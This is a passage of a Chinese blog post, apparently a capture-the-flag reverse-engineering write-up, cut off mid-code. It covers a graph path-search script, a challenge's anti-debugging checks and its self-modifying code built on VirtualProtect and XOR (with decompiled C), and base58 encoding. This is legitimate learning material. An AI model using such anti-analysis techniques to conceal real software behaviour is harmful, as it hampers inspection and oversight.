<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>xctf战役_部分re题目 - EP`s blog</title><meta name="Description" content="关于 LoveIt 主题"><meta property="og:title" content="xctf战役_部分re题目" />
<meta property="og:description" content="这次比赛做了四道简单的RE&hellip;难的师父做了嘻嘻,我好菜我好菜我好菜,Helica tql！ cycle graph 主要记录一份图路径搜索算法的代码hh" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" />
<meta property="og:image" content="https://linkleyping.top/logo.png"/>
<meta property="article:published_time" content="2020-04-05T15:22:45+08:00" />
<meta property="article:modified_time" content="2020-04-05T15:22:45+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://linkleyping.top/logo.png"/>

<meta name="twitter:title" content="xctf战役_部分re题目"/>
<meta name="twitter:description" content="这次比赛做了四道简单的RE&hellip;难的师父做了嘻嘻,我好菜我好菜我好菜,Helica tql！ cycle graph 主要记录一份图路径搜索算法的代码hh"/>
<meta name="application-name" content="EP`s blog">
<meta name="apple-mobile-web-app-title" content="EP`s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://linkleyping.top/2020xctf%E6%88%98%E5%BD%B9/" /><link rel="prev" href="https://linkleyping.top/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%A4%A9-txwp/" /><link rel="next" href="https://linkleyping.top/rop%E5%AD%A6%E4%B9%A0/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "xctf战役_部分re题目",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/linkleyping.top\/2020xctf%E6%88%98%E5%BD%B9\/"
        },"image": ["https:\/\/linkleyping.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  11523 ,
        "url": "https:\/\/linkleyping.top\/2020xctf%E6%88%98%E5%BD%B9\/","datePublished": "2020-04-05T15:22:45+08:00","dateModified": "2020-04-05T15:22:45+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/linkleyping.top\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "EP"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">  
    <div class="header-wrapper">  
        <div class="header-title">  
            <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
        </div>  
        <div class="menu">  
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-desktop">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                    <i class="fas fa-adjust fa-fw"></i>  
                </a>  
            </div>  
        </div>  
    </div>  
</header><header class="mobile" id="header-mobile">  
    <div class="header-container">  
        <div class="header-wrapper">  
            <div class="header-title">  
                <a href="/" title="EP`s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/icon.png"
        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
        data-sizes="auto"
        alt="/images/icon.png"
        title="/images/icon.png" />EP`s blog</a>  
            </div>  
            <div class="menu-toggle" id="menu-toggle-mobile">  
                <span></span><span></span><span></span>  
            </div>  
        </div>  
        <div class="menu" id="menu-mobile"><div class="search-wrapper">  
                    <div class="search mobile" id="search-mobile">  
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">  
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">  
                            <i class="fas fa-search fa-fw"></i>  
                        </a>  
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">  
                            <i class="fas fa-times-circle fa-fw"></i>  
                        </a>  
                        <span class="search-button search-loading" id="search-loading-mobile">  
                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
                        </span>  
                    </div>  
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">  
                        取消  
                    </a>  
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
                <i class="fas fa-adjust fa-fw"></i>  
            </a></div>  
    </div>  
</header>  
<div class="search-dropdown desktop">  
    <div id="search-dropdown-desktop"></div>  
</div>  
<div class="search-dropdown mobile">  
    <div id="search-dropdown-mobile"></div>  
</div>  
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">xctf战役_部分re题目</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://linkleyping.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>EP</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>writeup</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-04-05">2020-04-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 11523 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 23 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cycle-graph">cycle graph</a></li>
    <li><a href="#天津垓">天津垓</a></li>
    <li><a href="#fxck">fxck!</a>
      <ul>
        <li><a href="#加密部分">加密部分</a></li>
        <li><a href="#验证部分">验证部分</a></li>
      </ul>
    </li>
    <li><a href="#easyparser">easyparser</a></li>
    <li><a href="#clock">clock</a></li>
    <li><a href="#baby_wasi">baby_wasi</a>
      <ul>
        <li><a href="#反编译wasm">反编译wasm</a></li>
        <li><a href="#查找main函数">查找main函数</a></li>
        <li><a href="#wasmer-c-api">wasmer-c-api</a></li>
        <li><a href="#exp">exp</a></li>
      </ul>
    </li>
    <li><a href="#rubik魔方">Rubik(魔方)</a>
      <ul>
        <li><a href="#22魔方简介">2*2魔方简介</a></li>
        <li><a href="#py222用法">py222用法</a></li>
        <li><a href="#魔方还原">魔方还原</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>这次比赛做了四道简单的RE&hellip;难的师父做了嘻嘻,我好菜我好菜我好菜,Helica tql！</p>
<h2 id="cycle-graph">cycle graph</h2>
<p>主要记录一份图路径搜索算法的代码hh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 找到一条从start到end的路径    </span>
<span class="k">def</span> <span class="nf">findPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="o">=</span><span class="p">[]):</span>       
<span class="n">path</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">start</span><span class="p">]</span>    
<span class="k">if</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">:</span>    
    <span class="k">return</span> <span class="n">path</span>     
<span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">graph</span><span class="p">[</span><span class="n">start</span><span class="p">]:</span>    
    <span class="k">if</span> <span class="n">node</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>    
        <span class="n">newpath</span> <span class="o">=</span> <span class="n">findPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">node</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="p">)</span>    
        <span class="k">if</span> <span class="n">newpath</span><span class="p">:</span>    
            <span class="k">return</span> <span class="n">newpath</span>    
<span class="k">return</span> <span class="bp">None</span>    
     
<span class="c1"># 找到所有从start到end的路径    </span>
<span class="k">def</span> <span class="nf">findAllPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="o">=</span><span class="p">[]):</span>    
<span class="n">path</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span><span class="p">[</span><span class="n">start</span><span class="p">]</span>    
<span class="k">if</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">:</span>    
    <span class="k">return</span> <span class="p">[</span><span class="n">path</span><span class="p">]</span>    
     
<span class="n">paths</span> <span class="o">=</span> <span class="p">[]</span> <span class="c1">#存储所有路径        </span>
<span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">graph</span><span class="p">[</span><span class="n">start</span><span class="p">]:</span>    
    <span class="k">if</span> <span class="n">node</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>    
        <span class="n">newpaths</span> <span class="o">=</span> <span class="n">findAllPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">node</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="p">)</span>     
        <span class="k">for</span> <span class="n">newpath</span> <span class="ow">in</span> <span class="n">newpaths</span><span class="p">:</span>    
            <span class="n">paths</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">newpath</span><span class="p">)</span>    
<span class="k">return</span> <span class="n">paths</span>    
     
<span class="c1"># 查找最短路径    </span>
<span class="k">def</span> <span class="nf">findShortestPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="o">=</span><span class="p">[]):</span>    
<span class="n">path</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span><span class="p">[</span><span class="n">start</span><span class="p">]</span>    
<span class="k">if</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">:</span>    
    <span class="k">return</span> <span class="n">path</span>    
    
<span class="n">shortestPath</span> <span class="o">=</span> <span class="p">[]</span>    
<span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">graph</span><span class="p">[</span><span class="n">start</span><span class="p">]:</span>    
    <span class="k">if</span> <span class="n">node</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>    
        <span class="n">newpath</span> <span class="o">=</span> <span class="n">findShortestPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="n">node</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">path</span><span class="p">)</span>    
        <span class="k">if</span> <span class="n">newpath</span><span class="p">:</span>    
            <span class="k">if</span> <span class="ow">not</span> <span class="n">shortestPath</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">newpath</span><span class="p">)</span><span class="o">&lt;</span><span class="nb">len</span><span class="p">(</span><span class="n">shortestPath</span><span class="p">):</span>    
                <span class="n">shortestPath</span> <span class="o">=</span> <span class="n">newpath</span>    
<span class="k">return</span> <span class="n">shortestPath</span>    
     
<span class="s1">&#39;&#39;&#39;    
</span><span class="s1">主程序    
</span><span class="s1">&#39;&#39;&#39;</span>    
<span class="n">graph</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;B&#39;</span><span class="p">,</span> <span class="s1">&#39;C&#39;</span><span class="p">,</span><span class="s1">&#39;D&#39;</span><span class="p">],</span>    
     <span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="p">[</span> <span class="s1">&#39;E&#39;</span><span class="p">],</span>    
     <span class="s1">&#39;C&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;F&#39;</span><span class="p">],</span>    
     <span class="s1">&#39;D&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">],</span>    
     <span class="s1">&#39;E&#39;</span><span class="p">:</span> <span class="p">[],</span>    
     <span class="s1">&#39;F&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">],</span>    
     <span class="s1">&#39;G&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;E&#39;</span><span class="p">]}</span>    
     
<span class="n">onepath</span> <span class="o">=</span> <span class="n">findPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s1">&#39;一条路径:&#39;</span><span class="p">,</span><span class="n">onepath</span><span class="p">)</span>    
     
<span class="n">allpath</span> <span class="o">=</span> <span class="n">findAllPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">所有路径：&#39;</span><span class="p">,</span><span class="n">allpath</span><span class="p">)</span>    
     
<span class="n">shortpath</span> <span class="o">=</span> <span class="n">findShortestPath</span><span class="p">(</span><span class="n">graph</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;G&#39;</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">最短路径：&#39;</span><span class="p">,</span><span class="n">shortpath</span><span class="p">)</span>    
</code></pre></td></tr></table>
</div>
</div><h2 id="天津垓">天津垓</h2>
<p>两个考点，第一个是反调试，第二个是smc   <br>
反调试中一个是枚举窗口检测ida od等等，还有一个是判断STARTUPINFO信息   <br>
题目有两个验证部分，第一个验证是代码中直接可见的，我用z3求解解出来了，第二个是需要经过smc后才可见的，我做题的时候并没有发现smc，用的持续单步然后dump出解密后的代码的方式。 不过这个smc函数并不在基本的流程里面，主要是使用了cygwin这个动态库，然后调用的，我查了一下cygwin这个动态库，主要是用来在windows平台上实现linux平台函数使用的，我后来调试的时候也是发现先进入cygwin.dll然后就到了smc函数的地方，我没太懂这个具体的原理==下面是smc的部分</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// sub_100401506(sub_10040164D, 0x415, Str);    
</span><span class="c1">// 函数调用如上，主要用来修改sub_10040164D这个函数,修改的长度是0x415,Str是第一部分的输入    
</span><span class="c1"></span><span class="n">BOOL</span> <span class="kr">__fastcall</span> <span class="nf">sub_100401506</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>    
<span class="p">{</span>    
<span class="n">BOOL</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax    
</span><span class="c1"></span><span class="n">DWORD</span> <span class="n">flOldProtect</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]    
</span><span class="c1"></span><span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-4h]    
</span><span class="c1"></span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp+10h]    
</span><span class="c1"></span><span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp+18h]    
</span><span class="c1"></span><span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp+20h]    
</span><span class="c1"></span>    
<span class="n">lpAddress</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>    
<span class="n">v7</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>    
<span class="n">v8</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>    
<span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">Str</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">18</span> <span class="p">)</span>    
<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flOldProtect</span><span class="p">)</span> <span class="p">)</span>  <span class="c1">//将代码段的内存属性修改为可读写和执行    
</span><span class="c1"></span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>    
<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>    
<span class="o">*</span><span class="p">(</span><span class="n">lpAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="o">*</span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">18</span> <span class="o">+</span> <span class="n">v8</span><span class="p">);</span>    
<span class="n">result</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">flOldProtect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flOldProtect</span><span class="p">);</span>  <span class="c1">//修改后还原原来的内存属性    
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>    
<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>    
<span class="k">return</span> <span class="n">result</span><span class="p">;</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>在 Windows 程序中使用了VirtualProtect()函数来改变虚拟内存区域的属性。函数声明如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;Memoryapi.h&gt;    </span><span class="cp">
</span><span class="cp"></span>    
<span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>    
<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>    
<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>    
<span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>    
<span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>    
<span class="p">);</span>    
</code></pre></td></tr></table>
</div>
</div><p>VirtualProtect()函数有4个参数，lpAddress是要改变属性的内存起始地址，dwSize是要改变属性的内存区域大小，flAllocationType是内存新的属性类型，lpflOldProtect内存原始属性类型保存地址。而flAllocationType部分值如下表。在 SMC 中常用的是 0x40。   <br>



    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-0d587672ed95f2ba.jpg">
            <img src="/images/ec0b4f683ce7597660d4da19e3cd65cc/11884068-0d587672ed95f2ba.jpg" alt=""  />
        </a>
    </div>
</p>
<p>这里smc就是一个简单的与第一部分的输入进行一个异或，使用idc脚本可以得到修改后的代码    <br>
第二部分我还是用z3求解，但是因为乘数是素数也可以直接求逆元</p>
<h2 id="fxck">fxck!</h2>
<p>这道题出的还挺那啥的,出题人一手替换文件把我坑惨了&hellip;题目最开始的验证部分写的有问题,但是我也有自己的问题,第一个就是不会base58(u1s1就算不知道base58我就连16进制转58进制都没看出来&hellip;活该我菜)第二个就是不会brainfuck,我以为是个虚拟机分析了好久,虽然分析出来加密的过程了但是用时太长了&hellip;记录一下这两个</p>
<h3 id="加密部分">加密部分</h3>
<p>加密部分就是个base58,典型特征就是转58(0x3a)进制,还有查表操作,反编译的代码如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span> <span class="c1">//进制转换    
</span><span class="c1"></span><span class="p">{</span>    
<span class="n">v14</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">v11</span><span class="p">);</span>    
<span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v12</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>    
<span class="p">{</span>    
  <span class="n">v14</span> <span class="o">+=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">v20</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>    
  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v20</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">%</span> <span class="mh">0x3A</span><span class="p">;</span>    
  <span class="n">v14</span> <span class="o">/=</span> <span class="mh">0x3Au</span><span class="p">;</span>    
<span class="p">}</span>    
<span class="k">while</span> <span class="p">(</span> <span class="n">v14</span> <span class="p">)</span>    
<span class="p">{</span>    
  <span class="n">v4</span> <span class="o">=</span> <span class="n">v12</span><span class="o">++</span><span class="p">;</span>    
  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v20</span> <span class="o">+</span> <span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">%</span> <span class="mh">0x3A</span><span class="p">;</span>    
  <span class="n">v14</span> <span class="o">/=</span> <span class="mh">0x3Au</span><span class="p">;</span>    
<span class="p">}</span>    
<span class="p">}</span>    
<span class="n">v5</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">&#34;WAIT WAIT WAIT!&#34;</span><span class="p">);</span>    
<span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="k">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>    
<span class="n">v16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
